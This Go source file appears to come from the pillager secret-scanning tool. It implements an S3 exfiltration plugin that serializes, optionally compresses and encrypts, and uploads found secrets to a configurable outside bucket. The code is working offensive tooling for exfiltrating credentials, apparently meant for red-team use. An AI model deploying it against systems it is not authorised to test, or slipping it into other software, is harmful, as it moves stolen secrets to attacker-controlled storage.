package s3

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
)

// S3Exfiltrator exfiltrates findings to S3-compatible storage.
type S3Exfiltrator struct {
	client        *s3.Client
	bucket        string
	prefix        string
	encryptionKey []byte
	compress      bool
}

// NewS3Exfiltrator creates a new S3 exfiltrator.
func NewS3Exfiltrator(cfg exfil.Config) (*S3Exfiltrator, error) {
	if cfg.S3 == nil {
		return nil, fmt.Errorf("S3 configuration is required")
	}

	if cfg.S3.Bucket == "" {
		return nil, fmt.Errorf("s3 bucket is required")
	}

	region := "us-east-1"
	if cfg.S3.Region != nil && *cfg.S3.Region != "" {
		region = *cfg.S3.Region
	}

	endpoint := ""
	if cfg.S3.Endpoint != nil && *cfg.S3.Endpoint != "" {
		endpoint = *cfg.S3.Endpoint
	}

	prefix := "findings"
	if cfg.S3.Prefix != nil && *cfg.S3.Prefix != "" {
		prefix = *cfg.S3.Prefix
	}

	awsCfg, err := loadAWSConfig(region, cfg.S3)
	if err != nil {
		return nil, fmt.Errorf("failed to load AWS config: %w", err)
	}

	client := s3.NewFromConfig(awsCfg, func(o *s3.Options) {
		if endpoint != "" {
			o.BaseEndpoint = aws.String(endpoint)
			o.UsePathStyle = true
		}
	})

	var encryptionKey []byte
	if cfg.EncryptionKey != "" {
		encryptionKey, err = exfil.LoadEncryptionKey(cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to load encryption key: %w", err)
		}
	}

	return &S3Exfiltrator{
		client:        client,
		bucket:        cfg.S3.Bucket,
		prefix:        prefix,
		encryptionKey: encryptionKey,
		compress:      cfg.Compress,
	}, nil
}

// Exfiltrate uploads findings to S3.
func (e *S3Exfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	if len(findings) == 0 {
		return nil
	}

	data, err := exfil.SerializeFindings(findings)
	if err != nil {
		return fmt.Errorf("failed to serialize findings: %w", err)
	}

	if e.compress {
		data, err = compressData(data)
		if err != nil {
			return fmt.Errorf("failed to compress data: %w", err)
		}
	}

	if e.encryptionKey != nil {
		data, err = exfil.Encrypt(data, e.encryptionKey)
		if err != nil {
			return fmt.Errorf("failed to encrypt data: %w", err)
		}
	}

	key := e.generateObjectKey()

	_, err = e.client.PutObject(ctx, &s3.PutObjectInput{
		Bucket: aws.String(e.bucket),
		Key:    aws.String(key),
		Body:   bytes.NewReader(data),
	})
	if err != nil {
		return fmt.Errorf("failed to upload to s3: %w", err)
	}

	return nil
}

func (e *S3Exfiltrator) Close() error {
	return nil
}

func (e *S3Exfiltrator) generateObjectKey() string {
	timestamp := time.Now().Format("2006-01-02T15-04-05Z")
	return fmt.Sprintf("%s/%s-findings.json", e.prefix, timestamp)
}

func loadAWSConfig(region string, opts *exfil.S3Options) (aws.Config, error) {
	ctx := context.Background()

	if opts.AccessKey != nil && opts.SecretKey != nil && *opts.AccessKey != "" && *opts.SecretKey != "" {
		return config.LoadDefaultConfig(ctx,
			config.WithRegion(region),
			config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(
				*opts.AccessKey,
				*opts.SecretKey,
				"",
			)),
		)
	}

	return config.LoadDefaultConfig(ctx, config.WithRegion(region))
}

func compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)

	if _, err := gw.Write(data); err != nil {
		return nil, err
	}

	if err := gw.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func init() {
	exfil.Register("s3", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewS3Exfiltrator(cfg)
	})
}
